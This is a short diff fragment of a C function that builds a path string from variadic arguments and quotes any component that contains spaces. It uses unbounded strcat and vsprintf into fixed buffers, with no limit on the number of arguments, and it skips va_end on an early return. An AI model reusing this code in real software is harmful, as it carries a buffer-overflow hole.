+    va_start(args, basePath);
+    
+    for (;;) {
+        char *arg = va_arg(args, char*);
+        if (arg == NULL) {
+            break;
+
+        }
+
+        if (strlen(arg) > 253) {
+            return NULL;
+
+        }
+
+        if (strstr(arg, " ")) {
+            strcat(format, "/\"%s\"");
+
+        } else {
+            strcat(format, "/%s");
+
+        }
+
+    }
+
+    va_end(args);
+    va_start(args, basePath);
+    vsprintf(output, format, args);
+    va_end(args);
+
+    char *result = malloc(strlen(output) + 1);
+    if (!result) {
+        return NULL;
+    
+    }
+
+    strcpy(result, output);
+    return result;
+
+};
